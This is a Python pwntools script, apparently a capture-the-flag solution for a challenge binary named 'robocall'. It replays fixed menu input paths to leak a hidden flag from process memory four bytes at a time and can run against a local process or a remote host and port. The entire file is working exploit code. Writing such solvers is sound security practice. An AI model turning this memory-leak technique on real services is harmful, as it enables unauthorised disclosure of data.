#!/usr/bin/env python3
import struct
import re
import os
import sys
from pwn import *

context.log_level = 'error'

chunk_depths = [
    0x400, 0x480, 0x520, 0x570, 0x5a0, 0x640, 
    0x690, 0x6c0, 0x760, 0x7b0, 0x7e0, 0x800, 0x880
]

paths = {
    0x400: ['1', '2', 'outage_addr'],
    0x480: ['3', '1', '3', '1', '3', '1', '3', '1'],
    0x520: ['3', '1', '1', '2', 'outage_addr'],
    0x570: ['1', '4', '1', 'outage_addr'],
    0x5a0: ['3', '1', '3', '1', '3', '1', '3', '1', '3', '1'],
    0x640: ['3', '1', '3', '1', '1', '2', 'outage_addr'],
    0x690: ['3', '1', '1', '4', '1', 'outage_addr'],
    0x6c0: ['3', '1', '3', '1', '3', '1', '3', '1', '3', '1', '3', '1'],
    0x760: ['3', '1', '3', '1', '3', '1', '1', '2', 'outage_addr'],
    0x7b0: ['3', '1', '3', '1', '1', '4', '1', 'outage_addr'],
    0x7e0: ['3', '1', '3', '1', '3', '1', '3', '1', '3', '1', '3', '1', '3', '1'],
    0x800: ['3', '1', '3', '1', '1', '3', 'p', 'a', 'pet', '9', 'p', 'a', 'pet', '1', 'c1', 'c2', 'c3', 'c4'],
    0x880: ['1', '2', 'outage_addr', '3', '1', '3', '1', '3', '1', '3', '1'],
}

def get_process(target=None):
    if target:
        host, port = target.split(':')
        return remote(host, int(port))
    else:
        binary_path = './robocall' if os.path.exists('./robocall') else '../robocall'
        return process(binary_path)

def leak_chunk(cd, target=None):
    io = get_process(target)
    inputs = ['42'] + paths[cd] + ['1', '6', '2', 'phone', 'addr', 'pet', 'a', 'a']
    for inp in inputs:
        io.sendline(inp.encode())
    
    data = io.recvall(timeout=3).decode('latin1', errors='replace')
    io.close()
    
    m = re.findall(r'You\'ve entered \"(-?\d+)\"', data)
    if m:
        val = int(m[-1])
        return struct.pack('<i', val)
    return b'\x00\x00\x00\x00'

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else None
    print(f"[*] Starting flag extraction ({'Remote: ' + target if target else 'Local'})...")
    
    flag_chunks = []
    for i, cd in enumerate(chunk_depths):
        chunk_bytes = leak_chunk(cd, target)
        flag_chunks.append(chunk_bytes)
        print(f"[*] Chunk {i:2d} ({hex(cd)}): {chunk_bytes}")
    
    full_flag = b''.join(flag_chunks).rstrip(b'\x00').decode('latin1', errors='replace')
    print(f"\n[+] Flag: {full_flag}")

if __name__ == '__main__':
    main()
